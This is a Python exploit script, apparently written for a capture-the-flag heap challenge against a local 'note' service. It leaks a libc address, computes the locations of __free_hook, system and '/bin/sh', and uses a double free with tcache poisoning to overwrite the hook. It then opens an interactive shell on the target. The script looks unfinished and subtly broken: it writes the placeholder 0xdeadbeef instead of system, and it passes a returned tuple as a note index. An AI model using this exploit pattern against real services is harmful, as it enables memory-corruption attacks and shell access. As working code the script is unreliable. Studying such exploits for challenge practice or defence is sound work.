#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, sys, logging

logging.basicConfig(level=logging.DEBUG, format="\x1b[93;41m[-] %(message)s \x1b[0m")

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str:
      delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until):
  _ = read_until(f, skip_until)                                                                                       
  return read_until(f)

def sendline(f, line):
  if type(line) is str: 
    line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    
def dbg(ss):
  fmt = f"{ss}:"
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f"\t\t{hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f"\t\t{val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(fmt)

def hexify(a):
  return int(a, 16)

############## Utils #################
def menu():
  _  = read_until(f, '1: create note')
  _ += read_until(f, '2: delete note')
  _ += read_until(f, '3: exit')
  _ += read_until(f, 'Command >> ')
  #print(_)
  return;

def create_note(size, data):
  sendline(f, '1')
  sendline_after(f, '[*] Note data size:', str(size))
  sendline_after(f, '[*] Note data: ', data)
  idx = readline_after(f, '[+] Chunk stored Index: ') 
  idx = int(idx)
  #print("chunk idx: %d"%idx)
  return menu(), idx

  
def delete_note(idx):
  sendline(f, '2')
  sendline_after(f, '[+] Note index: ', str(idx))
  return menu()
  

#### plt/got, rop gadgets, symbs addrs and consts ####
ofs_puts        = 0x06dfd0 # 後で消す. 
ofs_malloc_hook = 0x3afc30 # 後で消す. 
ofs_free_hook   = 0x3b18e8 # 後で消す. 
ofs_system      = 0x041770 # 後で消す. 
ofs_binsh       = 0x1746fc # 後で消す. 
ofs_oneshot     = 0x041602

banner = 'test'
HOST, PORT = '127.0.0.1', 1337 

logging.info(banner)
s, f = sock(HOST, PORT)
addr_puts = int(readline_after(f, ':').strip(), 16)
dbg("addr_puts")

## resolve address ##
libc_base   = addr_puts - ofs_puts
free_hook   = libc_base + ofs_free_hook
addr_system = libc_base + ofs_system
binsh       = libc_base + ofs_binsh

dbg("libc_base")
dbg("addr_system")
dbg("binsh")
dbg("free_hook")

A = create_note(0x10, b'A' * 0x0f)
delete_note(A)
delete_note(A)
create_note(0x10, pQ(free_hook) + b'\n')
create_note(0x10, b'\n')
create_note(0x10, pQ(0xdeadbeef) + b'\n')

## 書き換えた関数ポインタをトリガ. 
input('gdb?')
delete_note(A)

shell(s)
